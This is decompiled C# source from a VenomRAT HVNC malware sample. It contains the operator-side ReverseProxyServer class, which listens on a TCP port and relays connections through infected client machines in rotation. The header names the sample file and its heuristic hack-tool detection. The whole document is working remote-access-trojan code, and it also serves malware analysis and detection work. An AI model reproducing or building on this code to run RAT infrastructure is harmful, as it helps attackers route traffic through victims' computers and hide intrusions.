// Decompiled with JetBrains decompiler
// Type: VenomRAT_HVNC.Server.Helper.ReverseProxyServer
// Assembly: VenomRAT_HVNC, Version=5.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 364FC72B-4DB8-403E-BB7F-732199A12380
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-666d190a7059c03b3572dd66e51b8232537a8650bbdcbfbe3f8335c830f3aeae.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace VenomRAT_HVNC.Server.Helper
{
  public class ReverseProxyServer
  {
    private Socket _socket;
    private readonly List<ReverseProxyClient> _clients;
    private uint _clientIndex;

    public event ReverseProxyServer.ConnectionEstablishedCallback OnConnectionEstablished;

    public event ReverseProxyServer.UpdateConnectionCallback OnUpdateConnection;

    public ReverseProxyClient[] ProxyClients
    {
      get
      {
        ReverseProxyClient[] array;
        lock (this._clients)
          array = this._clients.ToArray();
        return array;
      }
    }

    public ReverseProxyClient[] OpenConnections
    {
      get
      {
        ReverseProxyClient[] array;
        lock (this._clients)
        {
          List<ReverseProxyClient> reverseProxyClientList = new List<ReverseProxyClient>();
          for (int index = 0; index < this._clients.Count; ++index)
          {
            if (this._clients[index].ProxySuccessful)
              reverseProxyClientList.Add(this._clients[index]);
          }
          array = reverseProxyClientList.ToArray();
        }
        return array;
      }
    }

    public VenomRAT_HVNC.Server.Connection.Clients[] Clients { get; private set; }

    public ReverseProxyServer() => this._clients = new List<ReverseProxyClient>();

    public void StartServer(VenomRAT_HVNC.Server.Connection.Clients[] clients, string ipAddress, ushort port)
    {
      this.Stop();
      this.Clients = clients;
      this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      this._socket.Bind((EndPoint) new IPEndPoint(IPAddress.Parse(ipAddress), (int) port));
      this._socket.Listen(100);
      this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), (object) null);
    }

    private void AsyncAccept(IAsyncResult ar)
    {
      try
      {
        lock (this._clients)
        {
          this._clients.Add(new ReverseProxyClient(this.Clients[(int) (IntPtr) checked ((long) unchecked ((ulong) this._clientIndex % (ulong) this.Clients.Length))], this._socket.EndAccept(ar), this));
          ++this._clientIndex;
        }
      }
      catch
      {
      }
      try
      {
        this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), (object) null);
      }
      catch
      {
      }
    }

    public void Stop()
    {
      if (this._socket != null)
      {
        this._socket.Close();
        this._socket = (Socket) null;
      }
      lock (this._clients)
      {
        foreach (ReverseProxyClient reverseProxyClient in new List<ReverseProxyClient>((IEnumerable<ReverseProxyClient>) this._clients))
          reverseProxyClient.Disconnect();
        this._clients.Clear();
      }
    }

    public ReverseProxyClient GetClientByConnectionId(int connectionId)
    {
      ReverseProxyClient clientByConnectionId;
      lock (this._clients)
        clientByConnectionId = this._clients.FirstOrDefault<ReverseProxyClient>((Func<ReverseProxyClient, bool>) (t => t.ConnectionId == connectionId));
      return clientByConnectionId;
    }

    internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
    {
      try
      {
        if (this.OnConnectionEstablished == null)
          return;
        this.OnConnectionEstablished(proxyClient);
      }
      catch
      {
      }
    }

    internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
    {
      try
      {
        if (!proxyClient.IsConnected)
        {
          lock (this._clients)
          {
            for (int index = 0; index < this._clients.Count; ++index)
            {
              if (this._clients[index].ConnectionId == proxyClient.ConnectionId)
              {
                this._clients.RemoveAt(index);
                break;
              }
            }
          }
        }
      }
      catch
      {
      }
      try
      {
        if (this.OnUpdateConnection == null)
          return;
        this.OnUpdateConnection(proxyClient);
      }
      catch
      {
      }
    }

    public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

    public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
  }
}
